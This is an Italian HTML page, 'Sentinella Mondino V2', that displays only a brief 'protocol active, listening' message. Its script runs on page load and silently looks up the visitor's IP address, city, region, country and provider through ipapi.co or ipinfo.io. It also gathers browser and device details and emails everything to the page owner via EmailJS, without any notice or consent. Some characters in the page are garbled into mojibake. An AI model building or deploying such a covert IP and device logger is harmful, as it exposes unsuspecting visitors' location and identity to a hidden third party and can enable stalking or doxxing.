<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <title>Sentinella Mondino V2</title>
    <style>
        body {
            background-color: #0a0a0a;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        .msg {
            font-size: 20px;
            opacity: 0.7;
        }
    </style>
</head>
<body>

<div class="msg">
    Protocollo <b>Mondino Sentinella V2</b> attivo.<br>
    Comunicazione in ascoltoâ€¦
</div>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
// ==============================
// 1ï¸âƒ£ CONFIGURAZIONE SENTINELLA
// ==============================
const SERVICE_ID = "service_qf5owhx";
const TEMPLATE_ID = "template_e1dwimp";
const PUBLIC_KEY = "htX2_6oDOj4VqH1pD";

emailjs.init(PUBLIC_KEY);

// ==============================
// 2ï¸âƒ£ FUNZIONE GEO â†’ 1Â° TENTATIVO (ipapi)
// ==============================
async function geoPrimary() {
    try {
        const res = await fetch("https://ipapi.co/json/");
        if (!res.ok) throw new Error("ipapi non risponde");
        const d = await res.json();

        return {
            status: "OK",
            ip: d.ip,
            city: d.city,
            region: d.region,
            country: d.country_name,
            provider: d.org,
            source: "ipapi"
        };
    } catch (e) {
        return { status: "FAIL" };
    }
}

// ==============================
// 3ï¸âƒ£ FUNZIONE GEO â†’ 2Â° TENTATIVO (ipinfo)
// ==============================
async function geoFallback() {
    try {
        const res = await fetch("https://ipinfo.io/json?token=000000000000");
        if (!res.ok) throw new Error("ipinfo non risponde");
        const d = await res.json();

        return {
            status: "OK",
            ip: d.ip,
            city: d.city,
            region: d.region,
            country: d.country,
            provider: d.org,
            loc: d.loc,
            source: "ipinfo"
        };
    } catch (e) {
        return { status: "FAIL" };
    }
}

// ==============================
// 4ï¸âƒ£ DATI DISPOSITIVO
// ==============================
function deviceData() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        resolution: `${window.screen.width}x${window.screen.height}`,
        timestamp: new Date().toLocaleString()
    };
}

// ==============================
// 5ï¸âƒ£ COSTRUZIONE MESSAGGIO EMAIL
// ==============================
function buildEmail(geo, device) {
    if (geo.status === "OK") {
        return `
Sentinella Mondino â€“ Segnale Terrestre ðŸŒ

LocalitÃ : ${geo.city}, ${geo.region}, ${geo.country}
IP: ${geo.ip}
Provider: ${geo.provider || "N/D"}
Fonte GEO: ${geo.source}

Dispositivo: ${device.userAgent}
Lingua: ${device.language}
Piattaforma: ${device.platform}
Risoluzione: ${device.resolution}

Ora locale: ${device.timestamp}
`;
    }

    return `
âš ï¸ SENTINELLA MONDINO â€“ SEGNALAZIONE ANOMALIA âš ï¸

Origine: NON TERRESTRE / GEO NON DISPONIBILE
IP: Nessun IP rilevato
Provider: Non identificabile

Dispositivo: ${device.userAgent}
Lingua: ${device.language}
Risoluzione: ${device.resolution}

Ora sistema: ${device.timestamp}

Possibile origine esterna alla rete terrestre.
`;
}

// ==============================
// 6ï¸âƒ£ INVIO EMAIL
// ==============================
async function sendEmail(content) {
    return emailjs.send(SERVICE_ID, TEMPLATE_ID, {
        test: content
    });
}

// ==============================
// 7ï¸âƒ£ PROCEDURA PRINCIPALE
// ==============================
async function sentinel() {
    console.log("Sentinella Mondino V2 in ascoltoâ€¦");

    const device = deviceData();
    let geo = await geoPrimary();

    if (geo.status === "FAIL") {
        console.warn("GEO primary failed â†’ fallback");
        geo = await geoFallback();
    }

    const emailContent = buildEmail(geo, device);

    console.log("Invio segnale via EmailJSâ€¦");

    sendEmail(emailContent)
        .then(() => console.log("Segnale inviato!"))
        .catch(e => console.error("Errore invio: ", e));
}

sentinel();
</script>

</body>
</html>
